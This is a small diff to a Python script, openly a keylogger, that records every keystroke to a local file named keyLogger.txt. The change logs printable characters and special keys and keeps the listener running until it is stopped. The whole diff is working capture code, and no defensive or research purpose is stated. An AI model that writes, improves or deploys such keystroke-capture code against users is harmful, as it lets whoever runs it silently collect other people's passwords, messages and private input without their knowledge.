@@ -4,12 +4,13 @@ def keyPressed(key):
     print(str(key))
     with open('keyLogger.txt','a') as logKey:
         try:
-            char=key.char
-            logKey.write(char)
-        except:
-            print("error gettin char")
+            # Log printable characters
+            logKey.write(f'{key.char}')
+        except AttributeError:
+            # Log special keys
+            logKey.write(f'[{key}]')
 
 if __name__=="__main__":
-    listener=keyboard.Listener(on_press=keyPressed)
-    listener.start()
-    input()
+    
+    with keyboard.Listener(on_press=keyPressed) as listener:
+        listener.join()
